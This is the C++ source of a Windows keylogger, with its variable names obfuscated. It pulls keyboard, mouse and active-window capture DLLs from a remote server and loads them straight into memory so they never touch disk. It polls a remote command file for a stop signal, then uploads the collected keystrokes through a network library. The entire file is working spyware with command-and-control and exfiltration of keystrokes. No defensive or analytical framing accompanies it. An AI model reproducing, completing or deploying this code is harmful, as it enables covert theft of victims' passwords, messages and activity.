//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <mutex>
#include <vector>
#include "MemoryModule.h"

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPCSTR a = "network_lib.dll";
HMEMORYMODULE b, c, d;
HINSTANCE e;

//------------------------------------------------------------------------------------------------------------------------------

typedef int (*f)(const std::string&, const std::string&);
typedef std::string (*g)(const std::string&);
typedef std::vector<unsigned char> (*h)(const std::string&);
f i;
g j;
h k;

//==============================================================================================================================

typedef void(*l)(std::vector<std::string>*);
typedef void(*m)();
l n, o, p;
m q, r, s;

//------------------------------------------------------------------------------------------------------------------------------

bool t = true;
std::vector<std::string> u;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int v();
BOOL w(DWORD x);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char* argv[])
{
    std::atomic<bool> y(false);
    
    if (v() != 0) return 1;

    if (!SetConsoleCtrlHandler(w, TRUE))
    {
        std::cerr << "Error setting console control handler" << std::endl;
        return 1;
    }

    n(&u);
    p(&u);
    o(&u);

    std::thread z([&]()
    {
        while (true)
        {
            std::string aa = j("klogger_cmd.txt");
            if (aa[0] == 's')
            {
                y = true;
                i("klogger_cmd.txt", "`");

                std::ostringstream ab;
                for (const auto& ac : u) ab << ac;
                i("key_strokes.txt", ab.str());

                q();
                r();
                s();
                break; 
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        }
    });
    
    MSG ad;
    while (!y)
    {
        if (PeekMessage(&ad, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
        {
            TranslateMessage(&ad);
            DispatchMessage(&ad);
        }
    }

    z.join();

    FreeLibrary(e);
    MemoryFreeLibrary(b);
    MemoryFreeLibrary(c);
    MemoryFreeLibrary(d);

    return 0;
}

int v()
{
    e = LoadLibraryA(a);
    if (e == nullptr)
    {
        std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    k = (h)GetProcAddress(e, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    j = (g)GetProcAddress(e, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    i = (f)GetProcAddress(e, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
    if (!k || !i || !j)
    {
        std::cerr << "Failed to get one or more function addresses for network dll.\n";
        FreeLibrary(e);
        return 1;
    }

    std::vector<unsigned char> ae, af, ag;

    ae = k("keylog_k_lib.dll");
    af = k("keylog_m_lib.dll");
    ag = k("keylog_w_lib.dll");

    b = MemoryLoadLibrary(ae.data(), ae.size());
    if (b == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    p = (l)MemoryGetProcAddress(b, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    q = (m)MemoryGetProcAddress(b, "?Cleanup@@YAXXZ");
    if (!p || !q)
    {
        std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
        MemoryFreeLibrary(b);
        return 1;
    }

    c = MemoryLoadLibrary(af.data(), af.size());
    if (c == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    o = (l)MemoryGetProcAddress(c, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    r = (m)MemoryGetProcAddress(c, "?Cleanup@@YAXXZ");
    if (!o || !r)
    {
        std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
        MemoryFreeLibrary(c);
        return 1;
    }

    d = MemoryLoadLibrary(ag.data(), ag.size());
    if (d == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    n = (l)MemoryGetProcAddress(d, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    s = (m)MemoryGetProcAddress(d, "?Cleanup@@YAXXZ");
    if (!n || !s)
    {
        std::cerr << "Failed to get one or more function addresses for initialize_active_window dll.\n";
        MemoryFreeLibrary(d);
        return 1;
    }

    return 0;
}

BOOL w(DWORD x)
{
    switch (x)
    {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
            
            t = false;
            
            q();
            r();
            s();

            FreeLibrary(e);

            MemoryFreeLibrary(b);
            MemoryFreeLibrary(c);
            MemoryFreeLibrary(d);

            return TRUE;
        default:
            return FALSE;
    }
}